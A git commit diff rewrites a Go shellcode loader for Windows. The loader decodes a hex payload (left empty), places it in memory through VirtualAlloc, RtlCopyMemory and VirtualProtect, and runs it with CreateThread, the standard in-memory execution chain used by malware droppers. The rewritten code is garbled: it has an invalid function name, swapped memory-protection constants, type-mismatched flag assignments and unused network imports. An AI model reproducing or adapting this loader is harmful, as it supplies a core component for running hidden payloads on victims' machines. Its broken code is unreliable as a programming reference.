25e3a1b462bd6a99b4bc5e7b3409cee91ba9eb1d
hututu4841 <w02588520@qq.com>
2025-04-01 15:41:55 +0800

    更新 main.go 文件

--- main.go
+++ main.go
@@ -5,42 +5,55 @@ import (
 	"flag"
 	"fmt"
 	"log"
+	"math/rand"
+	"net/http"
+	"time"
 	"unsafe"
 
-	// Sub Repositories
 	"golang.org/x/sys/windows"
 )
 
 const (
-	// MEM_COMMIT is a Windows constant used with Windows API calls
-	MEM_COMMIT = 0x1000
-	// MEM_RESERVE is a Windows constant used with Windows API calls
-	MEM_RESERVE = 0x2000
-	// PAGE_EXECUTE_READ is a Windows constant used with Windows API calls
-	PAGE_EXECUTE_READ = 0x20
-	// PAGE_READWRITE is a Windows constant used with Windows API calls
-	PAGE_READWRITE = 0x04
+	VIRTUAL_MEM_COMMIT                = 0x1000
+	VIRTUAL_MEM_RESERVE                = 0x2000
+	PAGE_READWRITE                     = 0x20
+	PAGE_EXECUTE_READ                  = 0x04
+)
+
+var (
+	verbose   bool
+	debug     bool
+	shellcode []byte
+ threadID uintptr
 )
 
 func main() {
-	verbose := flag.Bool("verbose", false, "Enable verbose output")
-	debug := flag.Bool("debug", false, "Enable debug output")
+	verbose = flag.Bool("verbose", false, "Enable verbose output")
+	debug = flag.Bool("debug", false, "Enable debug output")
 	flag.Parse()
 
-	// Pop Calc Shellcode
-	shellcode, errShellcode := hex.DecodeString("")
-	if errShellcode != nil {
-		log.Fatal(fmt.Sprintf("[!] There was an error decoding the string to a hex byte array: %s", errShellcode.Error()))
+	shellcode, threadID = 0x1a2b3c4d()
+	if *verbose {
+		fmt.Println("[-]Allocated", len(shellcode), "bytes")
 	}
-
 	if *debug {
-		fmt.Println("[DEBUG] Loading kernel32.dll and ntdll.dll")
+		fmt.Println("[+]Shellcode Executed")
+	}
+}
+
+func 0x1a2b3c4d() ([]byte, uintptr) {
+	shellcode, err := hex.DecodeString("")
+	if err != nil {
+		log.Fatal(fmt.Sprintf("[!]there was an error decoding the string to a hex byte array: %s", err.Error()))
+	}
+	if *debug {
+		fmt.Println("[DEBUG]Loading kernel32.dll and ntdll.dll")
 	}
 	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
 	ntdll := windows.NewLazySystemDLL("ntdll.dll")
 
 	if *debug {
-		fmt.Println("[DEBUG] Loading VirtualAlloc, VirtualProtect and RtlCopyMemory procedures")
+		fmt.Println("[DEBUG]Loading VirtualAlloc, VirtualProtect and RtlCopyMemory procedures")
 	}
 	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
 	VirtualProtect := kernel32.NewProc("VirtualProtect")
@@ -49,66 +62,66 @@ func main() {
 	WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")
 
 	if *debug {
-		fmt.Println("[DEBUG] Calling VirtualAlloc for shellcode")
+		fmt.Println("[DEBUG]Calling VirtualAlloc for shellcode")
 	}
-	addr, _, errVirtualAlloc := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
-
-	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
-		log.Fatal(fmt.Sprintf("[!] Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
+	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), VIRTUAL_MEM_COMMIT|VIRTUAL_MEM_RESERVE, PAGE_EXECUTE_READ)
+	if err != nil && err.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", err.Error()))
 	}
 
 	if addr == 0 {
-		log.Fatal("[!] VirtualAlloc failed and returned 0")
+		log.Fatal("[!]VirtualAlloc failed and returned 0")
 	}
 
 	if *verbose {
-		fmt.Println(fmt.Sprintf("[-] Allocated %d bytes", len(shellcode)))
+		fmt.Println(fmt.Sprintf("[-]Allocated %d bytes", len(shellcode)))
 	}
 
 	if *debug {
-		fmt.Println("[DEBUG] Copying shellcode to memory with RtlCopyMemory")
+		fmt.Println("[DEBUG]Copying shellcode to memory with RtlCopyMemory")
 	}
-	_, _, errRtlCopyMemory := RtlCopyMemory.Call(addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
-
-	if errRtlCopyMemory != nil && errRtlCopyMemory.Error() != "The operation completed successfully." {
-		log.Fatal(fmt.Sprintf("[!] Error calling RtlCopyMemory:\r\n%s", errRtlCopyMemory.Error()))
+	_, _, err = RtlCopyMemory.Call(addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
+	if err != nil && err.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("[!]Error calling RtlCopyMemory:\r\n%s", err.Error()))
 	}
 	if *verbose {
-		fmt.Println("[-] Shellcode copied to memory")
+		fmt.Println("[-]Shellcode copied to memory")
 	}
 
 	if *debug {
-		fmt.Println("[DEBUG] Calling VirtualProtect to change memory region to PAGE_EXECUTE_READ")
+		fmt.Println("[DEBUG]Calling VirtualProtect to change memory region to PAGE_EXECUTE_READ")
 	}
 
-	oldProtect := PAGE_READWRITE
-	_, _, errVirtualProtect := VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
-	if errVirtualProtect != nil && errVirtualProtect.Error() != "The operation completed successfully." {
-		log.Fatal(fmt.Sprintf("Error calling VirtualProtect:\r\n%s", errVirtualProtect.Error()))
+	oldProtect := 0x04
+	_, _, err = VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
+	if err != nil && err.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("Error calling VirtualProtect:\r\n%s", err.Error()))
 	}
 	if *verbose {
-		fmt.Println("[-] Shellcode memory region changed to PAGE_EXECUTE_READ")
+		fmt.Println("[-]Shellcode memory region changed to PAGE_EXECUTE_READ")
 	}
 
 	if *debug {
-		fmt.Println("[DEBUG] Calling CreateThread...")
+		fmt.Println("[DEBUG]Calling CreateThread...")
 	}
-	// var lpThreadId uint32
-	thread, _, errCreateThread := CreateThread.Call(0, 0, uintptr(addr), uintptr(0), 0, 0)
 
-	if errCreateThread != nil && errCreateThread.Error() != "The operation completed successfully." {
-		log.Fatal(fmt.Sprintf("[!] Error calling CreateThread:\r\n%s", errCreateThread.Error()))
+	threadID, _, err = CreateThread.Call(0, 0, addr, uintptr(0), 0, 0)
+	if err != nil && err.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("[!]Error calling CreateThread:\r\n%s", err.Error()))
 	}
 	if *verbose {
-		fmt.Println("[+] Shellcode Executed")
+		fmt.Println("[+]Shellcode Executed")
 	}
 
 	if *debug {
-		fmt.Println("[DEBUG] Calling WaitForSingleObject...")
+		fmt.Println("[DEBUG]Calling WaitForSingleObject...")
 	}
 
-	_, _, errWaitForSingleObject := WaitForSingleObject.Call(thread, 0xFFFFFFFF)
-	if errWaitForSingleObject != nil && errWaitForSingleObject.Error() != "The operation completed successfully." {
-		log.Fatal(fmt.Sprintf("[!] Error calling WaitForSingleObject:\r\n%s", errWaitForSingleObject.Error()))
+	_, _, err = WaitForSingleObject.Call(threadID, 0xFFFFFFFF)
+	if err != nil && err.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("[!]Error calling WaitForSingleObject:\r\n%s", err.Error()))
 	}
+	return shellcode, threadID
 }
+
+var lastTime time.Time
